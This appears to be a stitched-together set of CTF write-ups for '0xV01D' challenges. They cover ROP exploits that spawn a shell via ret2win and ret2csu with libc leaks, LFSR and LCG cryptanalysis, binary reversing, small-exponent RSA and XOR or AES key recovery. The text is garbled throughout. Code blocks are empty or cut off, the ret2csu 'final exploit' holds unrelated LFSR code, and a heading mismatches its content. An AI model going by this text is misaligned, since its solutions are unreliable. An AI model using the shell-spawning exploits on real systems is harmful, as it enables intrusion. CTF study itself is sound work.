## Initial inspection

```json

}
```

The `token_id` values range from 5000 to 5095 (96 distinct values), and `allowed` is a boolean. The 96 entries strongly suggest 96 bits.

## Digging in

(If the mapping is flipped, the output is not readable ASCII — `U+200B` → `1`, `U+200C` → `0` produces garbage, so this is the correct orientation.)

Concatenating yields the flag.

The filename `generations.txt` and the model name `self-consistency-repair-v2` are both references to **self-consistency decoding** — a technique where a model is sampled multiple times and the answer that appears most often is chosen. When the underlying text is stable, the majority vote at every position recovers the true token even if each individual sample corrupts a few characters.

## Recovering the flag

First confirm all ten samples have equal length:

```
$ for s in $(grep sample_ generations.txt); do echo ${#s}; done
41 41 41 41 41 41 41 41 41 41
```

They are all 41 characters. Now, for each of the 41 positions, count how many samples show each character and take the most common one:

```python
from collections import Counter

samples = [line.split(": ", 1)[1] for line in open("generations.txt") if "sample_" in line]

flag = ""
for pos in range(len(samples[0])):
    counts = Counter(s[pos] for s in samples)
    flag += counts.most_common(1)[0][0]

print(flag)
```

Every hallucinated character is outvoted. For example, at position 4 (`i` in `Void`) the tally is `{i:7, B:1, C:1, V:1}`, at position 17 (`o` in `vote`) it is `{o:8, n:1, }:1}`, and so on. The consensus at every position wins, yielding:

```
0xVoid{majority_vote_beats_hallucination}
```

# Checkpoint Seed

> The model checkpoint is reproducible, including the secret-masking layer.

flag: `0xVoid{seeded_models_dream_the_same_dream}`

<details>

<summary> Solved by deepseek-v4-flash-0731 </summary>

## Challenge

A single JSON file is provided: `checkpoint.json`, a model metadata dump for a
fictional checkpoint `dream-checkpoint-final-FINAL-v3`. It has four key
fields:

- `seed`: `8675309`
- `layer`: `secret_mask_head`
- `mask_algorithm`: `python random.Random(seed).randrange(256) per byte`
- `cipher_hex`: the XOR-encrypted flag, as hex

The challenge title — **Checkpoint Seed** — plus the description
("reproducible, including the secret-masking layer") point at the key insight:
machine-learning checkpoints are pinned to a seed so training is reproducible.
If the same PRNG instance and seed are used to derive the masking key stream, an
attacker who knows the seed can reproduce the masking exactly.

## Initial inspection

The metadata loudly claims `"Publishing the seed is safe because random means
random"`. That is fake confidence and the core of the trick: Python's
`random.Random` is a **Mersenne Twister**, a deterministic PRNG, *not* a
cryptographically secure one. Given the same seed, it always produces the same
stream of values. There is no real randomness to hide behind.

The masking scheme is the standard "stream XOR" pattern:

```
mask_byte[i] = random.Random(seed).randrange(256)
cipher_byte[i] = plaintext_byte[i] XOR mask_byte[i]
```

So decryption is symmetric: reproduce the mask with the seed and XOR it with
the given `cipher_hex`.

## Digging in

```python

    "fd15d91bda4a7d8ec6927d13d8ed240feaa3190ad722913a44c24c71150da1b2367d88f1db08f94bd477"
)

rng = random.Random(seed)
mask = [rng.randrange(256) for _ in range(len(cipher))]
print("".join(chr(c ^ m) for c, m in zip(cipher, mask)))
```

# q1-Shellgame

> A very specific pair of gifts: `0xdeadbeef` and `0xcafebabe`. Overflow the guard's stack and hand them over in exactly the right order. There is a `win()` that will drop you a shell — but it needs arguments.

## Binary

`chall` — 64-bit ELF, x86-64, dynamically linked, **stripped**.

- **NX** enabled (no shellcode on the stack)
- **No PIE** (fixed addresses)
- **No canary**

## Analysis

Key functions:

| Function | Address | Purpose |
|----------|---------|---------|
| `main`   | `0x4010b0` | prints banner, `read(0, rsp, 0x100)` |
| `win`    | `0x401211` | checks args, then `system("/bin/sh")` |
| gadget   | `0x401204` | `pop rdi; ret` |
| gadget   | `0x401206` | `pop rsi; ret` |
| gadget   | `0x40101a` | plain `ret` (alignment) |

`main` decompiles to roughly:

```c
int main() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin,  0, 2, 0);
    puts("V0ID shellgame — overflow your way to win(0xdeadbeef, 0xcafebabe)");
    read(0, rsp, 0x100);
    return 0;
}
```

`main` does `sub rsp, 0x48` and reads into `rsp` directly (no frame pointer), so the saved return address sits at `rsp + 0x48`. The read of `0x100` bytes lets us overflow the whole stack frame. There is **no canary**.

`win` at `0x401211`:

```asm
0x401211:  endbr64
0x401215:  cmp edi, 0xdeadbeef      ; arg1 must be 0xdeadbeef
0x40121b:  jne  wrong_gifts
0x40121d:  cmp esi, 0xcafebabe      ; arg2 must be 0xcafebabe
0x401223:  jne  wrong_gifts
0x401225:  sub rsp, 8
0x401229:  lea rdi, "V0ID: the gate opens. ..."
0x401230:  call puts
0x401235:  lea rdi, "/bin/sh"
0x40123c:  add rsp, 8
0x401240:  jmp system               ; spawns a shell
```

So `win()` is a ret2win target that validates `rdi` and `rsi`. On x86-64 System V ABI those are the first two argument registers, so we just arrange them with `pop` gadgets before returning into `win`.

## Exploit

ROP chain layout:

```
+0x48 bytes of 'A'        ; overflow padding → saved RIP
0x40101a  ret              ; align stack (rsp%16 == 8 at win entry)
0x401204  pop rdi; ret
0xdeadbeef                 ; gift 1 → rdi
0x401206  pop rsi; ret
0xcafebabe                 ; gift 2 → rsi
0x401211  win              ; drop shell
```

Notes:

- The offset is `0x48` (72), **not** `0x50` — `main` uses `sub rsp, 0x48` with no `push rbp`, so the return address is directly at `rsp+0x48`.
- The leading `ret` is needed for 16-byte stack alignment: `win` calls `puts`/`system`, which use aligned moves (`movaps`); without it the calls segfault.
- **Careful with `read`:** it consumes *everything* available in one call, so don't append shell commands to the same payload — wait for the shell to spawn, then send commands.

PoC:

# q2-ropcsu

## Challenge Description

64-bit ELF with **NX, no PIE, no canary**. Imported functions are only `puts`,
`read` and `setvbuf`. The banner literally tells you the plan:

```
V0ID ropcsu — no win() here. leak libc, then pwn it.
```

> "The `__libc_csu_init` gadgets are waiting to call anything you point them at.
> Two-stage: leak, then land."

We are given the exact `libc.so.6` (glibc 2.39) that runs on the server, so once
we leak any libc address we can compute everything else.

## Reversing the binary

### `main` (0x401090)

```c
int main() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin,  0, 2, 0);
    puts("V0ID ropcsu — no win() here. leak libc, then pwn it.");
    read(0, rsp, 0x200);   // reads 0x200 bytes onto the stack!
    return 0;
}
```

`read` writes up to `0x200` bytes into a 0x58-byte buffer (`sub rsp, 0x58`), so the
saved RIP sits at offset **0x58** and `main` ends with `leave`-free epilogue
`add rsp, 0x58; ret`. Straight buffer overflow → ROP.

### The ret2csu gadgets

Starting at `0x4011e0` the compiler emitted a classic `__libc_csu_init`-style
sequence (decoded from raw bytes at `0x4011d0`):

```
4011e0: endbr64
4011e4: pop rbx              <- gadget A: 0x4011e4
4011e5: pop rbp
4011e6: pop r12
4011e8: pop r13
4011ea: pop r14
4011ec: pop r15
4011ee: ret
4011ef: mov rdx, r15         <- gadget B: 0x4011ef
4011f2: mov rsi, r14
4011f5: mov edi, r13d
4011f8: call [r12 + rbx*8]
4011fc: add rbx, 8
401200: cmp rbx, rbp
401203: jne  0x4011e4
401205: add rsp, 8
401209: ret
```

Key facts:

- `gadget B` lets us call **any** address stored in memory at `[r12 + rbx*8]`.
- `r13d` is moved into `edi` (32-bit, zero-extended) → works for addresses
  `< 0x100000000`; `r14`/`r15` are full 64-bit for `rsi`/`rdx`.
- Setting `rbx = 0` and `rbp = 8` makes the loop run **exactly once**:
  after the call `rbx` becomes 8, `cmp rbx,rbp` is equal, so it falls into
  `add rsp, 8; ret`.

> Addresses note: `gadget B` starts at `0x4011ef`, **not** `0x4011eb`. From raw
> bytes `4c 89 fa / 4c 89 f6 / 44 89 ef / 41 ff 14 dc`, `mov rdx,r15` is at
> `0x4011ef`. `0x4011eb` is mid-instruction (`0x5e` → `pop rsi`) and crashes.

## GOT layout (no PIE)

| Symbol | GOT slot |
|--------|----------|
| `puts` | 0x404000 |
| `read` | 0x404008 |
| `setvbuf` | 0x404010 |

Writable `.data/.bss`: `0x404028` is used as a scratch buffer, `0x404030` holds
the string.

## Exploit strategy (leak → land)

Stage 1 – one overflow sends a chain of csu blocks:

1. `csu(puts@got, rdi = puts@got)` — calls `puts(puts@got)`, printing the libc
   address of `puts`. Compute `libc_base = leak - puts_offset`.
2. `csu(read@got, 0, 0x404028, 0x200)` — a **second controlled `read`** writes
   stage 2 into `.data`: currently-unknown addresses can be supplied once the
   leak arrives.
3. `ret` gadget (stack re-alignment, see below).
4. `csu(0x404028, 0x404030, 0, 0)` — calls `[0x404028]`, which stage 2 filled
   with `system`, passing `rdi = 0x404030` pointing at `"/bin/sh"`.

Stage 2 (sent over the socket, read into `0x404028`):

```
p64(system) + b"/bin/sh\x00"
```

That writes `system` to memory slot `0x404028` and the string to `0x404030`.
`libc_base + 0x58750 = system`, libc offset of `/bin/sh` is `0x1cb42f`.

### Why alignment matters

glibc 2.39 `system()` uses SSE instructions (`movaps`) and **crashes when entered
with `rsp ≡ 0 (mod 16)`**. The csu gadget pushes the return address before each
call, so whether the final `call` sees an aligned stack depends on the total bytes
consumed by the chain *and* the unknown rsp alignment at `main` entry. A single
plain `ret` (`0x4010e3`) moved everything 8 bytes and fixed it. Empirically the
working layout is:

```
pad(0x58)
csu(leak puts)
csu(read stage2)
ret            # <- alignment shim
csu(system)
```

(Verified locally in WSL before running remote — the exact alignment shim was
found by trying 0–3 leading/all shims; only `1` shim before the system block won.)

### Parsing the leak

`puts(puts@got)` prints raw pointer bytes until the first `\x00` (usually 6–7
bytes), then `\n`. Reconstruct with:

```python
puts_addr = u64(io.recvuntil(b'\n').strip().ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
```

## Final exploit

```py
def gf2_mulmod(a: int, b: int, mod: int, n: int) -> int:
    """Carry-less multiply of two GF(2) polys, reduced mod `mod` (deg n)."""
    r = 0
    while b:
        if b & 1:
            r ^= a
        b >>= 1
        a <<= 1
        if a >> n & 1:
            a ^= mod
    return r


def gf2_powmod(base: int, exp: int, mod: int, n: int) -> int:
    r, base = 1, base % (1 << n)
    while exp:
        if exp & 1:
            r = gf2_mulmod(r, base, mod, n)
        base = gf2_mulmod(base, base, mod, n)
        exp >>= 1
    return r


def is_primitive(taps: int, n: int) -> bool:
    """taps is the n-bit tap mask; char. poly is x^n + sum taps_i x^i."""
    if not taps & 1:
        return False
    poly = taps | (1 << n)
    order = (1 << n) - 1
    if gf2_powmod(2, order, poly, n) != 1:
        return False
    return all(gf2_powmod(2, order // q, poly, n) != 1
               for q in MERSENNE_FACTORS[n])


def derive_taps(seed: int, n: int, label: bytes) -> int:
    """Deterministically grow a primitive tap mask from the seal-II seed."""
    xof = hashlib.shake_256(b"VOIDLOCK/TAPS/" + label + b"/" +
                            seed.to_bytes(16, "big")).digest(8192)
    for i in range(0, len(xof) - 4, 4):
        cand = (int.from_bytes(xof[i:i + 4], "big") & ((1 << n) - 1)) | 1
        if is_primitive(cand, n):
            return cand
    raise RuntimeError("no primitive polynomial found -- reroll the drop")


class LFSR:
    """Fibonacci LFSR. Output is the LSB, feedback is parity(state & taps)."""

    def __init__(self, taps: int, state: int, n: int):
        self.taps, self.state, self.n = taps, state % (1 << n), n
        if self.state == 0:
            raise ValueError("dead register")

    def clock(self) -> int:
        out = self.state & 1
        fb = bin(self.state & self.taps).count("1") & 1
        self.state = (self.state >> 1) | (fb << (self.n - 1))
        return out


def seal_three(seed: int, states: tuple, nbytes: int) -> bytes:

            for n, st, lbl in zip(LENGTHS, states, (b"ALPHA", b"BETA", b"GAMMA"))]

        for _ in range(8):
            x1, x2, x3 = (r.clock() for r in regs)
            byte = (byte << 1) | (x1 & x2) ^ (x2 & x3) ^ x3
        out.append(byte)
    return bytes(out)
```

## SEAL I / THE ECHO — Franklin–Reiter related messages

State size is 128 bits; each output leaks only the top 32 bits. This is a
**truncated LCG** — recover the hidden low 96 bits of every state with a lattice.

Write `x_i = S_i + t_i` where `S_i = leak[i] << 96` is known and `t_i < 2^96`
is unknown. The recurrence `x_{i+1} = a x_i + b (mod p)` becomes

```

```

The (unique) solution is the point of the affine lattice (one particular
solution + L) closest to the origin, i.e. every coordinate is `< 2^96`. Use a
CVP → SVP embedding, LLL-reduce, and read off `t_0`:

Registers: 19 (ALPHA), 21 (BETA), 23 (GAMMA) bits — less than 2⁶³ combined.
The taps are public given the seed (shake256). We have known plaintext:
`HEADER` (147 bytes) + `FOOTER` (`\n[EOT]\n`, 7 bytes) gives 1232 known
keystream bits from `ks = ct ^ known_pt`.

The nonlinear combiner

```
f(x1, x2, x3) = x1x2 ⊕ x2x3 ⊕ x3
```

has the truth table:

| x1x2x3 | out |
|---|---|
| 000 | 0 |
| 001 | 1 |
| 010 | 0 |
| 011 | 0 |
| 100 | 0 |
| 101 | 1 |
| 110 | 1 |
| 111 | 1 |

Its linear correlations are asymmetric:

- `P(f = x3) = 6/8 = 0.75`  ← strong
- `P(f = x1) = 5/8 = 0.625`
- `P(f = x2) = 1/2`  ← none

**Step 1 — recover GAMMA (reg3, 23 bits) with a fast correlation attack.**

Every LFSR output bit is a *linear* function of the initial state:
`out_t(state) = parity(c_t & state)`, where `c_t` is the coefficient vector at
clock `t` (built by simulating the clock on each basis vector `e_j`).

Because `P(y_t = x3_t) = 0.75`, pick a random 23-position subset of the known
keystream, **assume** `x3_t = y_t` there, and solve the 23×23 GF(2) system for
the candidate state. Roughly `1/0.75^23 ≈ 75` trials contain one fully-correct
subset; verify each candidate by global agreement across all 1232 known bits
(true ≈ 75%, random ≈ 50%). No enumeration over 2²³:

```python
state = gauss_solve([c_t for t in subset], [y[t] for t in subset], 23)
# accept if agreement with y over all known positions > 0.68
```

This finds `reg3` in under a second.

**Step 2 — recover ALPHA (reg1, 19 bits) with an exact filter.**

Now `x3_t` is fully known. Rearrange the combiner:

```
z_t = y_t ⊕ x3_t = x2_t (x1_t ⊕ x3_t)
```

So whenever `x1_t == x3_t` we are forced to have `z_t == 0`. Brute-force only
the *smallest* register (2¹⁹ = 524288 states); a wrong guess is rejected almost
immediately — it must survive `x1_t == x3_t ⇒ z_t == 0` at every known bit, a
condition a random guess meets with probability ~`(3/4)^1232 ≈ 0`.

```python
for s1 in range(1, 1 << 19):

    for t in known_positions:

```


```py
def trim(p):
    p = p[:]
    while p and p[-1] == 0:
        p.pop()
    return p  # [] means zero polynomial


def poly_mod_div(a, b, mod):
    a, b = a[:], b[:]
    da, db = len(a) - 1, len(b) - 1
    if da < db:
        return [0], a
    lc = b[-1] % mod
    if int(gmpy2.gcd(lc, mod)) not in (1, mod):
        raise ValueError("zero divisor lc=%d gcd=%d" % (int(lc), int(gmpy2.gcd(lc, mod))))
    inv = gmpy2.invert(lc, mod)
    q = [0] * (da - db + 1)
    for i in range(da - db, -1, -1):
        coeff = (a[db + i] * inv) % mod
        q[i] = coeff
        for j in range(db + 1):
            a[j + i] = (a[j + i] - coeff * b[j]) % mod
    r = a[:db]
    while r and r[-1] == 0:
        r.pop()
    return q, r


def poly_mul(a, b, mod):
    r = [0] * (len(a) + len(b) - 1)
    for i, ai in enumerate(a):
        if ai:
            for j, bj in enumerate(b):
                r[i + j] = (r[i + j] + ai * bj) % mod
    return r
```

```py
def gauss_solve(rows, vals, n):
    M = [(r, v) for r, v in zip(rows, vals)]
    pivot = {}
    while M:
        col = 0
        sel = None
        for c in range(n):
            for i in range(len(M)):
                if M[i][0] >> c & 1:
                    sel, col = i, c
                    break
            if sel is not None:
                break
        if sel is None:
            break
        M[0], M[sel] = M[sel], M[0]
        r, v = M[0]
        pivot[col] = (r, v)
        M = M[1:]
        for i in range(len(M)):
            if M[i][0] >> col & 1:
                M[i] = (M[i][0] ^ r, M[i][1] ^ v)
    if len(pivot) < n:
        return None
    known = {}
    for col in sorted(pivot, reverse=True):
        r, v = pivot[col]
        s = v
        for other in known:
            if r >> other & 1:
                s ^= known[other]
        known[col] = s & 1
    x = sum(known[c] << c for c in known)
    return x
```

```py
    if p1 is None:
        return p2
    if p2 is None:
        return p1

        return None
    if p1 == p2:
        l = (3 * p1[0] * p1[0] + a) * pow(2 * p1[1], -1, m) % m
```

# Afterimage Protocol

## Goal

Recover the unique 16-character identifier the program accepts.

```
0xV01D{[A-Za-z0-9]{16}}
```

## High-level analysis

The single function `start` (0x401000):

1. Prints `Afterimage Protocol v2\nidentifier> ` via `sys_write`.
2. Reads up to 0x50 bytes with `sys_read` into a stack buffer.
3. Validates the literal prefix `0xV01D{` (bytes 0..6), a closing `}` at byte 23, a total length of 24, and that the 16 inner bytes are all `[A-Za-z0-9]`. They are copied into a 16-byte working array `v59`.
4. Runs a **320-iteration virtual machine** over `v59` (the "folded instruction tape").
5. Verifies the final `v59` against a fixed target derived from a hash. On success prints `reflection accepted`, otherwise `no matching reflection`.

There are no calls: the "VM" is inline, straight-line code with a `switch` dispatch inside the loop.

## Program structure

### Fixed data (segment `.mist`, at 0x402090)

| Offset | Size | Meaning |
| ------ | ---- | ------- |
| 0x08   | 8    | `afterimage` seed `v12` (LE u64) = `0xd1ceb00c7a11f00d` |
| 0x10   | 0xa00| Tape table: 320 × 8-byte entries `table[idx]` |
| 0xa10  | 16   | Target overlay `byte_402AA0` |

### The 320 iterations

```
idx = (41 + 73*i) % 320                    0 <= i < 320
v22 = table[idx] ^ splitmix(x_in)
  x_in = (v12 ^ (0xD6E8FEB86659FD93*idx) ^ 0xA17E5EEDC0DEC0DE) + 0x9E3779B97F4A7C15  (mod 2^64)

v16 (FNV-1a 64, init 0xCBF29CE484222325) hashed over the 8 little-endian bytes of v22
```

The 8 bytes of `v22` are placed at `[rsp+0x18..0x1f]`:
`v54=b0, v55=b1, v56=b2, v57=b3, v58=dwords b4..b7`.

Opcode selection:

```
case = (((29*idx - 89) & 0xFF) ^ v54) % 7
```

- case 0 (default): `v59[v26] ^= v58 & 0xFF`
- case 1: `v59[v26] += v58 & 0xFF`
- case 2: `v59[v26] = ROL8(v59[v26], max(v57 & 7, 1))`
- case 3: swap `v59[v26]` and `v59[v56 & 0xF]`
- case 4: `v59[v26] = (( (v58&0xFF|1) * v59[v26] ) & 0xFF) + ((v58 >> 8) & 0xFF)` (mod 256)
- case 5: block cipher round on the two 64-bit halves
- case 6: rotate the 16 bytes left by `max(v57 & 0xF, 1)`

### Case 5 details

```
A = LE64(v59[0:8]); B = LE64(v59[8:16])
v35 = ROL64(B + idx*0x100000001B3 + ((v58 << 32) | (v58 ^ 0xA5C39E71)), (v57 % 0x3F) + 1)
K   = (2*(v26 | 1)) ^ 0x9E3779B185EBCA87
new v59[0:8]  = B
new v59[8:16] = v35 ^ A ^ (B*K)   (all mod 2^64)
```

### Final check

```
v42 = v12 ^ v16
for i in 0..15:
    F_i = splitmix64( v42 ^ (i*0x9E3779B97F4A7C15) + 0x9E3779B97F4A7C15 )
    require  F_i & 0xFF == byte_402AA0[i] ^ v59[i]
```

i.e. the final state must be `target[i] = byte_402AA0[i] ^ (F_i & 0xFF)`.

Because the opcode and all its parameters depend only on fixed data (not on the input),
`target` is a fixed 16-byte image.

## Why reversal works

Every VM operation is a bijection:

- XOR / addition / ROL / swap / rotate are invertible.
- Case 4 (the trap): `add al, dh` adds **DH** — the second byte of the 32-bit `v58` —
  into the low byte of a 16-bit multiply product. In the disassembly the intended operation is

  ```
  movzx ecx, dil
  mov    eax, edx          ; v58
  add    rcx, r10
  or     eax, 1            ; m = (v58 & 0xFF) | 1  (odd)
  mul    BYTE PTR [rcx]    ; AX = AL * v59[v26]
  add    al, dh            ; AL += (v58 >> 8) & 0xFF
  mov    [rcx], al
  ```

  So `y = ((m*x) mod 256) + ((v58 >> 8) & 0xFF)`, with `m` odd → multiplication by `m`
  mod 256 is a permutation, adding a constant keeps it one. Inverse:

  ```
  x = ((y - ((v58 >> 8) & 0xFF)) * modinv(m, 256)) & 0xFF
  ```

- Case 5 is inverted as
  ```
  B_old = A' ; A_old = B' ^ v35 ^ (B_old * K)
  ```
  where `v35` is recomputed — critically — from the **stored first half** A' (the old B).

A 50-input roundtrip (`forward ∘ reverse == identity`) plus final acceptance in the binary
confirmed the model.

### `main` (0x1160)


All the real logic lives in `sub_1390`.

---

## 2. Inside the validator: `sub_1390` (0x1390)

The code is a 3-round scrambling loop followed by a 37-step keyed check loop.
The flavour hints point straight at this structure:

- *"understand how time is shuffled"* → `byte_2140`, a permutation that
  dictates the order in which positions are consumed.
- *"walk the core backwards"* → we reconstruct the input by walking the check
  loop forward with known state (or, equivalently, inverting it position by
  position).

### 2.1 Decoy: the "time shuffle" (first loop)

The first loop (0x13CD – 0x1481) writes 37 bytes into a local stack buffer
`v21` over three rounds, using the input and several constants:

```c
v2 = 259; v3 = 0; v4 = 0;
memset(v21, 0, 37);
while (1)
{
  v21[v2 - 259] = ROL1((v4 + input[v4 + v2 - 259]) ^ v3, 1);
  for (v6 = v2 - 252; v6 != v2; v6 += 7) {
    v9 = v6 % 37;
    v5 += 13;
    v21[v9] = ROL1((v5 + input[(v9 + v4) % 37]) ^ v21[v9], 1);
  }
  if (++v4 == 3) break;
  v3 = v21[v2 - 248];
  v2 += 11;
}
```

This is a well-crafted **decoy**. The `7` step-size iterates every position
mod 37 (7 is a generator of ℤ₃₇*), which looks like a real shuffle, but the
resulting `v21` buffer is **never read again** in the second loop. The whole
first loop is dead store. It is only there to mislead static analysis.

(Confirmed by disassembling the second loop: it references `input`, five
global arrays, and state registers — never `[rsp+…]`.)

### 2.2 Real check loop (0x14D1 – 0x1542)

Five arrays live in `.rodata`:

| Symbol | Addr | Role |
|---|---|---|
| `byte_2140` | 0x2140 | index permutation (0..36), "shuffle order" |
| `byte_2100` | 0x2100 | add constants |
| `byte_2080` | 0x2080 | rotation amounts (1..7) |
| `byte_20C0` | 0x20C0 | xor constants |
| `unk_2040` | 0x2040 | expected check bytes (the "hash") |

Key registers in the loop:

- `rdx` = loop index `i` (0..36)
- `r9d` = `input[byte_2140[i]]` → call it `b`
- `eax` = running 32-bit key `v13` (init `0x9E3779B9` = 0x9E3779B9, the TEA delta)
- `r10d` = secondary key `r10` (init `0x42`)

For each `i`:

```c
edi = byte_2100[i] + b;              // add constant + byte
edi = edi + 17*i;                    // 17*i
edi = edi ^ v13;                     // xor with running key
m   = ROL32(edi, byte_2080[i]);      // sub_1380: rol eax, cl

v13_new = (73244475 * m + i + 655360001) & 0xFFFFFFFF;   // 0x45D9F3B, 0x27100001

shifted = (v13_new >> (8 * (i & 3))) & 0xFF;             // pick a byte of v13
cl = (shifted + b) & 0xFF;
cl ^= byte_20C0[i];
cl ^= r10;

if (cl != unk_2040[i]) return 0;                          // check

// advance state
r10 = (b + i + cl) & 0xFF;      // cl == unk_2040[i] on success
```

`sub_1380` (0x1380) is just:

```asm
mov eax, edi
mov ecx, esi
rol eax, cl     ; ROL32
ret
```

Written as a clean C model:

```c
for (i = 0; i < 37; i++) {
    uint32_t m = rol32(((uint32_t)(17*i + byte_2100[i] + input[byte_2140[i]]) ^ v13), byte_2080[i]);
    v13 = (73244475u * m + i + 655360001u) & 0xFFFFFFFF;
    uint8_t chk = ((uint8_t)(v13 >> (8*(i&3))) + input[byte_2140[i]]) ^ byte_20C0[i] ^ r10;
    if (chk != unk_2040[i]) return 0;
    r10 = (input[byte_2140[i]] + i + unk_2040[i]) & 0xFF;
}
```

Note: `r10` only ever matters through its **low byte** (every use is
`xor cl, r10d` followed by an 8-bit compare), so a byte-level model is exact.

---

## 3. Validation against the real binary

Before trusting the model, verify it against the live binary, since a single
wrong byte in a single equation makes the whole solver diverge.

Run the binary under gdb with ASLR disabled, input
`0xV01D{AAAAAAAAAAAAAAAAAAAAAAAAAAAAA}`, break at the compare
`0x...151f` (`cmp [r11+rdx], cl`), and dump `b`, `nv13`, `r10`, `cl`, and
`unk_2040[i]` for every `i` (patch the `je` at 0x1523 to `jmp` so the loop
keeps running past failed checks).

Comparing those 37 ground-truth register dumps with the Python model showed
**exact agreement** on `nv13`, `cl`, and `r10` progression for every index.
That made the model trustworthy (the loop's `shifted` value is indeed derived
from the *new* `v13`, and `r10` evolves with the accepted byte).

---

## 4. Solving

At each step `i` the equation has **one** unknown, `b = input[byte_2140[i]]`,
and `v13` / `r10` depend only on previously chosen bytes. So we can solve the
state machine deterministically / with DFS.

Two observations that make it trivial:

1. `byte_2140` is a permutation of `0..36`, so every byte of the input is
   pinned by exactly one equation.
2. Known characters act as hard constraints:
   - positions `0..6` = `0xV01D{`
   - position `36` = `}`
   - map positions back to indices via `byte_2140` and force those indices to
     their fixed byte values.

Simple solver — a DFS over the few candidate bytes per step, with the known
prefix/trailer positions pinned:

## Vulnerability
The public exponent is tiny: `e = 3`. In RSA, encryption is

```
c = m^e mod n
```

Whenever the plaintext `m` is small enough that `m^3 < n`, the modular reduction does nothing, and the equation simply becomes `c = m^3`.

Here `c` has ~157 digits while `n` has ~309 digits, which tells us `m^3` never wrapped around the modulus — so we can recover `m` by taking the integer cube root of `c`.

This is the classic **low public exponent / small message attack**.

## Solve Script
```python

# fix floating-point rounding

    cube -= 1
while (cube + 1) ** 3 <= c:
    cube += 1

assert cube ** 3 == c

print(m.to_bytes((m.bit_length() + 7) // 8, 'big'))
```

### Alternative (integer-only, no floats)
```python
def iroot(n, k):
    lo, hi = 0, 1
    while hi ** k <= n:
        hi *= 2
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        if mid ** k <= n:
            lo = mid
        else:
            hi = mid
    return lo

m = iroot(c, 3)
print(m.to_bytes((m.bit_length() + 7) // 8, 'big'))
```

> Note: modern Python (3.11+) ships exact `math.isqrt` only for square roots, but `math.isqrt` does not support cube roots, so we roll our own `iroot` or use high-precision `decimal`.

## The Bug

`NoteDecryptor.java` reveals the "encryption" is trivially broken:

```java
public static final int KEY = 85;

public static String decrypt(byte[] encrypted) {
    int length = encrypted.length;
    byte[] bArr = new byte[length];
    for (int i = 0; i < length; i++) {
        bArr[i] = (byte) (encrypted[i] ^ 85);
```

This is a **XOR cipher with a hardcoded key of 85 (0x55)** — a fixed-byte XOR, which is not real encryption. Anyone with the binary (or a decompilation) can recover the secret.

## 3. The native library fragments


## 5. Decryption

`obsidian-cold-bladeforge-` is 25 bytes — not a valid AES key length, so the
app feeds it through a key derivation. Using `SHA-256(material)` as the 32-byte
(256-bit) AES key and `shard-vault-v1` as AAD succeeds:

```python
import hashlib
from binascii import unhexlify
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

sk_order = [2, 0, 3, 1]
frags = {0: b"cold-", 1: b"forge-", 2: b"obsidian-", 3: b"blade"}
material = b"".join(frags[i] for i in sk_order)      # obsidian-cold-bladeforge-

key  = hashlib.sha256(material).digest()             # 32-byte AES-256 key
iv   = unhexlify("9d25e1e2a448b52d5f6c106b")
tag  = unhexlify("38e47eef449017ef5b36d680154d88be")

aad  = b"shard-vault-v1"

print(AESGCM(key).decrypt(iv, ct + tag, aad))
# b'0xV01D{obsidian_cold_blade_forged_from_native_shards}'
```
